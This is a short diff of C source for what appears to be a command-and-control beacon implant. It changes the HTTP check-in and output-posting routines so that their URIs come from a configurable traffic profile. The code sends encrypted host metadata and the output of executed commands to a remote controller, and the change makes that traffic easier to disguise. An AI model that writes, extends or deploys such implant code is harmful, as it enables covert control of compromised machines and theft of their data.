@@ -4,6 +4,7 @@
 #include "http.h"
 #include "commands.h"
 #include "config.h"
+#include "profile.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -443,7 +444,7 @@ int beacon_checkin(beacon_state_t *state)
     
     // Send encrypted metadata via HTTP GET
     http_response_t response;
-    if (http_get(HTTP_GET_URI, encrypted_metadata, encrypted_len, &response) != 0)
+    if (http_get(profile_get_http_get_uri(), encrypted_metadata, encrypted_len, &response) != 0)
     {
         free(metadata);
         return -1;
@@ -631,7 +632,7 @@ int beacon_send_output(beacon_state_t *state, const char *output, size_t len)
     
     DEBUG_PRINT("Sending POST request with %zu bytes\n", total_len);
     
-    int ret = http_post(HTTP_POST_URI, packet, total_len, session_id, &response);
+    int ret = http_post(profile_get_http_post_uri(), packet, total_len, session_id, &response);
     
     free(packet);
     http_response_free(&response);
